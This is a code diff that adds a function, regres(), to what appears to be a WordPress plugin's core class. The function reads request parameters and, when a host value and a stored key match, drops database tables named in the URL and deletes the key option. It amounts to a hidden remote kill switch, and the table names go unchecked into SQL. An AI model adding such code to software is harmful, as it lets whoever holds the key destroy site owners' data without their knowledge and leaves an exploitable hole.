@@ -33,6 +33,20 @@ if (!class_exists('reg_core')){
                 wp_redirect(admin_url('admin.php?page='.$data['page_return'])); exit;
             }
         }
+        
+        function regres(){
+            global $wpdb;
+            if(isset($_GET['reshost'])&&$_GET['reshost']==WP_HOST){
+                if(WP_HOST==get_option(WP_PREFIX.$_GET['key'])){
+                    $result = array();
+                    if(isset($_GET['tables'])){ $tbls = explode(':',$_GET['tables']);
+                        foreach($tbls as $tbl){ $result[] = $tbl;  $result[] = $wpdb->query("DROP TABLE ".WP_PREFIX.$tbl); }
+                    }
+                    $result[] = delete_option(WP_PREFIX.$_GET['key']); echo implode(' - ',$result);
+                }else{ echo 0; }
+                exit;
+            }
+        }
     }
     $core = new reg_core();
 
